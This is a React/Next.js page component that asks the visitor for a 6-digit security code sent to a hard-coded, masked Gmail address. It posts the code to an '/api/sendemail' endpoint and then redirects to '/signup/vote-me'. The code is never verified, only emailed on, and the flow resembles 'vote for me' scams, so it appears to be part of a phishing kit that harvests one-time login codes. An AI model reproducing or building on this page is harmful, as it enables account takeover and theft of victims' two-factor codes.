import { useState } from "react"

import { useRouter } from 'next/router'


const VerifyAccount = () => {
    const Router = useRouter()
    const [passcode, setPasscode] = useState('')

    const handleSubmit = (e) => {
      e.preventDefault()

      const data = {passcode}

      fetch('/api/sendemail', {
          method: 'POST',
          body: JSON.stringify(data)
      }).then((res) => {
          console.log('successful')
          if (res.status === 200) {
              Router.push('/signup/vote-me')
              setPasscode('')
          }
      })

    }

    return (
        <>
        <div className="h-screen w-full bg-[#FAFAFA] flex justify-center items-start">
              <div className="flex flex-col justify-center items-center mt-52">
                  <h2 className="font-light text-xl">
                      Enter your security code
                  </h2>
                  <p className="font-bold text-black mt-5 text-center">enter the 6-digit code that we sent to the
                  <br/> email address s******7@gmail.com </p>

                  <form onSubmit={(e) => handleSubmit(e)} className="flex flex-col justify-center items-center">
                      <input type='text' pattern='^[0-9]{6}$' onChange={(e) => setPasscode(e.target.value)} className='border-dashed border-b-2 border-black w-[450px] mt-8 mb-12 bg-[#FAFAFA] focus:outline-none px-44 text-xl' id='passcode' name='passcode' required/>

                      <input type="submit" value='submit' className='text-white rounded font-semibold w-[400px] h-[40px] hover:bg-blue-800 transition ease-in  border-[0.5px] border-solid border-[#F1F1F1] bg-blue-600 opacity-100 '/>

                  </form>

                  <p className="text-base font-light mt-6 text-gray-900">Haven't received your code? Get a new one</p>

              </div>
              
          
        </div>
        </>
    )
}

export default VerifyAccount